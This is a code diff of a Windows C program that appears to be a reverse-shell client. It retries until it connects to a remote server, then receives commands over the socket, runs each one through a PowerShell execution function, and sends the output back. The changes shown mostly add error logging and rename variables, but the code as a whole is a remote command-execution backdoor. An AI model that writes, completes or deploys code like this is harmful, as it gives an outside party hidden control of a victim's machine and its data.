@@ -8,8 +8,9 @@
 #include <string.h>
 #include <io.h>
 #include <fcntl.h>
-#include "commandmanager.h"
 #include <windows.h>
+
+#include "commandmanager.h"
 
 #define MAX_SIZE 200000
 
@@ -34,9 +35,10 @@ int main()
     while ((result = connect(
         soc, (const struct sockaddr *) &sai, sizeof(sai))) != 0)
         {
-            _putws(L"Cannot connect to server!\n");
+            wprintf(L"Cannot connect WSAE: %d, result: %d, LastError %d\n", WSAGetLastError(), result, GetLastError());
             Sleep(10000);
         }
+    
 
     wchar_t dataw[MAX_SIZE];
     unsigned char datac[MAX_SIZE];
@@ -45,9 +47,10 @@ int main()
     memset(dataw, 0, sizeof(dataw));
     memset(datac, 0, sizeof(datac));
 
+    int reciered;
     int sended;
-    while ((sended = recv(soc, datac, sizeof(datac), 0)) > 0)
-    {                    
+    while ((reciered = recv(soc, datac, sizeof(datac), 0)) > 0)
+    {     
         int nibites = MultiByteToWideChar(CP_UTF8, 0, datac, -1, NULL, 0);
             int iconverted = MultiByteToWideChar(
                 CP_UTF8, 0, datac, -1, dataw, nibites);
@@ -55,9 +58,9 @@ int main()
         execute_powershell_command(dataw, datac, &written_bytes);
         Sleep(1000);
         
-        send(soc, datac, written_bytes, 0);
+        sended = send(soc, datac, written_bytes, 0);
+        wprintf(L"Send return: %d, WSAE: %d, last erorr: %d\n", sended, WSAGetLastError(), GetLastError());
     }
     
-
     return 0;
 }
